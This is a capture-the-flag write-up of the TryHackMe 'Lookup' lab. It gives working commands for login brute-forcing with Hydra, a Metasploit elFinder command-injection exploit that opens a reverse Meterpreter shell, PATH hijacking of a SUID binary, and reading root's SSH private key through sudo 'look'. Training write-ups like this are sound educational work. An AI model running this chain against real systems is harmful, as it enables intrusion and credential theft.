---
title: "THM: Lookup"
date: 2025-02-12
categories: [CTF, Red Team]
tags: [CTF, Red Team]
permalink: /posts/ctf-redteam-lookup
image:
  path: /assets/img/thumbnails/ctf-redteam-lookup.png
---


### **Walkthrough**

#### **CTF Platform**: TryHackMe  
#### **Level**: Easy

#### **Tools Used**:
- **Nmap**: For scanning the target network to identify open ports and services.
- **Gobuster**: For enumerating subdomains and directories to uncover hidden resources.
- **Hydra**: For brute-forcing login credentials.
- **Metasploit**: For exploiting the elFinder command injection vulnerability.
- **Python**: For spawning an interactive shell.
- **Linpeas**: For automating enumeration and identifying privilege escalation vectors.

#### **Resources Used**:
- **Lookup**: [TryHackMe](https://tryhackme.com/room/lookup)
- **GTFOBins**: A repository of Unix binaries that can be exploited for privilege escalation.
- **SecLists**: A collection of wordlists used for brute-forcing credentials with Hydra.
- **Exploit DB**: An alternative resource for finding exploits, such as the one used for elFinder.


### **Step 1: Scanning the Target Network**
We begin by scanning the target machine `10.10.41.18` using **Nmap** to identify open ports and services.

#### Command:
```bash
nmap 10.10.41.18 -sV -sC
```

#### Output:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 17:27 IST
Nmap scan report for lookup.thm (10.10.41.18)
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

#### Observations:
- **Port 22 (SSH)**: Running OpenSSH 8.2p1.
- **Port 80 (HTTP)**: Running Apache HTTP Server 2.4.41.

---

### **Step 2: Discovering Subdomains with Gobuster**
To find any hidden subdomains or directories, we use **Gobuster**:

#### Command:
```bash
gobuster dns -d lookup.thm -w /usr/share/wordlists/dirb/common.txt
```

#### Output:
```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     lookup.thm
[+] Method:                  DNS
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Timeout:                 10s
===============================================================
2025/01/05 18:00:00 Starting gobuster in DNS subdomain enumeration mode
===============================================================
files.lookup.thm (Status: FOUND)
...
```

#### Key Concept:
- **Gobuster**: A tool for discovering subdomains, directories, and files on a web server. In this case, we used it to uncover the `files.lookup.thm` subdomain.

---

### **Step 3: Adding Target to Hosts File**
For easier navigation, we add the target's IP to the `/etc/hosts` file.

#### Commands:
```bash
echo "10.10.41.18 lookup.thm" | sudo tee -a /etc/hosts
echo "10.10.41.18 files.lookup.thm" | sudo tee -a /etc/hosts
```

---

### **Step 4: Navigating to the Web Application**
After updating the hosts file, we open the web application in a browser. The login page appears.

#### Attempting Default Credentials:
We attempt to log in with common default credentials but are met with a "wrong password" message and a 3-second delay before redirection.

#### Key Concept:
- **Brute Force Protection**: The delay is likely implemented to prevent brute-force attacks.

---

### **Step 5: Brute Forcing Login Using Hydra**
Since default credentials didn't work, we proceed with brute-forcing the login page using **Hydra**.

#### Command:
```bash
hydra -L /snap/seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again"
```

#### Output:
```
[80][http-post-form] host: lookup.thm   login: jose   password: password123
```

#### Key Concept:
- **Hydra**: A powerful tool for brute-forcing login forms. It automates the process of trying multiple username-password combinations.

---

### **Step 6: Logging In**
Using the discovered credentials (`jose:password123`), we log into the system. After logging in, we are redirected to the `files.lookup.thm` domain.

---

### **Step 7: Exploring the `credential.txt` File**
Upon opening the `credential.txt` file, we find some credentials that might be for SSH. However, attempting to use these credentials fails:

#### Command:
```bash
ssh think@10.10.41.18
```

#### Output:
```
think@10.10.41.18's password:
Permission denied, please try again.
```

---

### **Step 8: Identifying Vulnerabilities**
While interacting with the system, we discover a vulnerable web application called **elFinder** running on the target machine.

#### Version Discovery:
By inspecting the web interface, we determine the version of elFinder (`2.1.47`).

#### Searching for Exploits:
We search for exploits related to this version in **Metasploit** and **Exploit DB**:

#### Commands:
```bash
msfconsole -q
search elfinder 2.1.47
```

#### Output:
```
Matching Modules
================

    #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                                ---------------  ----       -----  -----------
   0  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection
```

#### Key Concept:
- **Metasploit**: A framework for developing and executing exploit code against remote targets.
- **Exploit DB**: A database of public exploits and shellcode. You could have searched for the vulnerability here as well.

---

### **Step 9: Exploiting the elFinder Vulnerability**
We select and configure the exploit module for elFinder:

#### Commands:
```bash
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
set LHOST tun0
set RHOST files.lookup.thm
run
```

#### Output:
```
[*] Started reverse TCP handler on 10.17.14.127:4444 
[*] Uploading payload 'TRNyzgLuCE.jpg;echo ...' (1975 bytes)
[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/elFinder/php/.7mrFCOx.php) ...
[*] Sending stage (40004 bytes) to 10.10.41.18
[+] Deleted .7mrFCOx.php
[*] Meterpreter session 1 opened (10.17.14.127:4444 -> 10.10.41.18:35566)
```

#### Key Concept:
- **Command Injection**: The vulnerability allows us to inject commands into the application, which are then executed by the server.

---

### **Step 10: Spawning a Shell**
Once inside the system, we have a limited shell as the `www-data` user. To make it more interactive, we spawn a proper shell using Python:

#### Command:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### Key Concept:
- **PTY Shell**: A pseudo-terminal provides a fully interactive shell, allowing us to execute complex commands and navigate the system effectively.

At this point, we could have used **linpeas** to automate the enumeration process and check for every privilege escalation possibility:

#### Steps:
1. Upload `linpeas.sh` to the target machine.
2. Execute it with the following command:
   ```bash
   ./linpeas.sh
   ```
3. Linpeas would have highlighted potential privilege escalation vectors, such as misconfigured SUID binaries or weak file permissions.

---

### **Step 11: Privilege Escalation**
As the `www-data` user, we check for potential privilege escalation opportunities.

#### Checking SUID Binaries:
We search for binaries with the SUID bit set:

#### Command:
```bash
find / -perm /4000 2>/dev/null
```

#### Output:
```
/usr/sbin/pwm
```

#### Key Concept:
- **SUID Bit**: Files with the SUID bit set allow users to execute them with the file owner's privileges.

#### Exploiting the `pwm` Binary:
We manipulate the `PATH` variable to exploit the `pwm` binary:

#### Commands:
```bash
export PATH=/tmp:$PATH
echo -e '#!/bin/bash\n echo "uid=33(think) gid=33(think) groups=33(think)"' > /tmp/id
chmod +x /tmp/id
/usr/sbin/pwm
```

This changes the user to `think`.

---

### **Step 12: SSH Brute-Forcing**
We perform an SSH brute-force attack using Hydra to gain access as the `think` user:

#### Command:
```bash
hydra -l think -P wordlist.txt ssh://lookup.thm
```

#### Output:
```
think:josemario.AKA(think)
```

#### Logging In:
```bash
ssh think@lookup.thm
```

#### Retrieving User Flag:
```bash
cat /home/think/user.txt
{REDACTED}
```

---

### **Step 13: Privilege Escalation to Root**
As the `think` user, we check for sudo privileges:

#### Command:
```bash
sudo -l
```

#### Output:
```
User think may run the following commands on lookup:
(ALL) /usr/bin/look
```

#### Exploiting the `look` Command:
Using **GTFOBins**, we find a method to read sensitive files with the `look` command:

#### Command:
```bash
LFILE=/root/.ssh/id_rsa
sudo look '' "$LFILE"
```

This grants us the root user's private SSH key.

#### Logging In as Root:
```bash
ssh -i /tmp/id_rsa root@lookup.thm
```

#### Retrieving Root Flag:
```bash
cat /root/root.txt
{REDACTED}
```




